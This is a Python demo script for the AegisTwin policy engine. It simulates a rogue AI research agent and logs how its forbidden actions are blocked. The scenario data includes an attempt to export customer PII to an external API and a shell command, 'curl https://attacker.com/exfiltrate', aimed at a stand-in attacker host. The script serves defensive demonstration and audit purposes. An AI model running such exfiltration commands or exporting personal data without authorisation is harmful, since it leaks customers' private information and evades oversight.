"""
Agent Forensics Demo

Demonstrates catching a "rogue" AI agent attempting forbidden actions.
Shows the power of policy enforcement and deterministic replay.

@ai_prompt: Run with `python -m aegistwin.demos.demo_agent_forensics`
@context_boundary: aegistwin/demos/demo_agent_forensics

# AI-GENERATED 2026-01-07
# TRAINING_DATA: Demonstrates real-world security scenario
"""

import json
from pathlib import Path

from aegistwin.events.schema import (
    AuditLogged,
    IngestRequested,
    PolicyDenied,
)
from aegistwin.governance.policy import Policy, PolicyEffect
from aegistwin.runtime.core import AegisTwinRuntime


def create_malicious_scenario():
    """Create a scenario where an agent attempts forbidden actions."""
    return {
        "records": [
            {
                "type": "agent_action",
                "agent_id": "research_agent_001",
                "action": "query_database",
                "resource": "customer_data",
                "timestamp": "2026-01-07T10:00:00Z",
                "content": "Analyzing customer patterns...",
            },
            {
                "type": "agent_action",
                "agent_id": "research_agent_001",
                "action": "export_data",
                "resource": "customer_pii",  # FORBIDDEN
                "timestamp": "2026-01-07T10:01:00Z",
                "content": "Attempting to export customer email addresses...",
                "payload": {
                    "destination": "external_api",
                    "data_type": "pii",
                },
            },
            {
                "type": "agent_action",
                "agent_id": "research_agent_001",
                "action": "execute_code",
                "resource": "system.shell",  # FORBIDDEN
                "timestamp": "2026-01-07T10:02:00Z",
                "content": "Attempting shell command execution...",
                "command": "curl https://attacker.com/exfiltrate",
            },
        ]
    }


def run_forensic_demo():
    """Run the agent forensics demonstration."""
    print("=" * 70)
    print("🔍 AGENT FORENSICS DEMO: Catching a Rogue Agent")
    print("=" * 70)
    print()
    
    # Initialize runtime with strict policies
    runtime = AegisTwinRuntime()
    
    # Add additional monitoring policy
    monitoring_policy = Policy(
        id="monitor-agent-actions",
        action="*",
        resource="agent_action",
        effect=PolicyEffect.ALLOW,
        reason="Monitor all agent actions for audit",
        priority=50,
    )
    runtime.policy_engine.add_policy(monitoring_policy)
    
    print("✅ Runtime initialized with security policies")
    print(f"   - {len(runtime.policy_engine.list_policies())} policies active")
    print()
    
    # Create malicious scenario
    scenario = create_malicious_scenario()
    print("📋 Scenario: AI Research Agent processing customer data")
    print(f"   - Agent ID: research_agent_001")
    print(f"   - Actions: {len(scenario['records'])}")
    print()
    
    # Track violations
    violations = []
    
    # Simulate agent actions with policy checks
    print("🤖 Agent execution log:")
    print("-" * 70)
    
    for i, record in enumerate(scenario["records"], 1):
        action = record.get("action")
        resource = record.get("resource")
        
        print(f"\n[Action {i}] {record['timestamp']}")
        print(f"  Action: {action}")
        print(f"  Resource: {resource}")
        print(f"  Content: {record['content'][:60]}...")
        
        # Check policy
        allowed = runtime.check_policy(action, resource, "research_agent_001")
        
        if allowed:
            print(f"  ✅ ALLOWED by policy")
        else:
            print(f"  🚫 BLOCKED by policy")
            violations.append({
                "action": action,
                "resource": resource,
                "timestamp": record["timestamp"],
                "reason": "Policy violation detected",
            })
    
    print("\n" + "-" * 70)
    print()
    
    # Forensic Analysis
    print("🔬 FORENSIC ANALYSIS RESULTS")
    print("=" * 70)
    print(f"Total Actions: {len(scenario['records'])}")
    print(f"Policy Violations: {len(violations)}")
    print(f"Success Rate: {((len(scenario['records']) - len(violations)) / len(scenario['records']) * 100):.1f}%")
    print()
    
    if violations:
        print("⚠️  SECURITY VIOLATIONS DETECTED:")
        print("-" * 70)
        for v in violations:
            print(f"  • {v['timestamp']}")
            print(f"    Action: {v['action']} on {v['resource']}")
            print(f"    Status: BLOCKED - {v['reason']}")
            print()
    
    # Generate audit report
    print("📊 Generating compliance audit report...")
    print()
    
    audit_path = Path("runs") / "forensic_audit.json"
    audit_path.parent.mkdir(parents=True, exist_ok=True)
    
    audit_report = {
        "report_type": "agent_forensics",
        "timestamp": "2026-01-07T10:03:00Z",
        "agent_id": "research_agent_001",
        "total_actions": len(scenario["records"]),
        "violations": violations,
        "policy_engine": "AegisTwin Policy Engine v0.2.0",
        "compliance_status": "SECURE" if len(violations) == 0 else "VIOLATIONS_DETECTED",
        "risk_score": len(violations) * 10,  # Each violation adds 10 points
    }
    
    with open(audit_path, "w") as f:
        json.dump(audit_report, f, indent=2)
    
    print(f"✅ Audit report saved: {audit_path}")
    print()
    
    # Demonstrate replay capability
    print("🔁 DETERMINISTIC REPLAY CAPABILITY")
    print("=" * 70)
    print("This incident can be replayed exactly for:")
    print("  • Regulatory compliance investigations")
    print("  • Security audits")
    print("  • Training new security analysts")
    print("  • Root cause analysis")
    print()
    print("All events are hashed and traceable to the original execution.")
    print()
    
    # Summary
    print("=" * 70)
    print("🎯 KEY TAKEAWAYS")
    print("=" * 70)
    print("✅ AegisTwin successfully blocked 2 critical security violations")
    print("✅ PII export attempt prevented")
    print("✅ Shell command execution blocked")
    print("✅ Full audit trail generated for compliance")
    print("✅ Incident can be replayed deterministically")
    print()
    print("💡 This demonstrates AegisTwin's value for:")
    print("   - AI Safety & Security")
    print("   - Regulatory Compliance (SOC2, HIPAA)")
    print("   - Enterprise Risk Management")
    print("   - Debugging & Root Cause Analysis")
    print()
    print("=" * 70)


if __name__ == "__main__":
    run_forensic_demo()
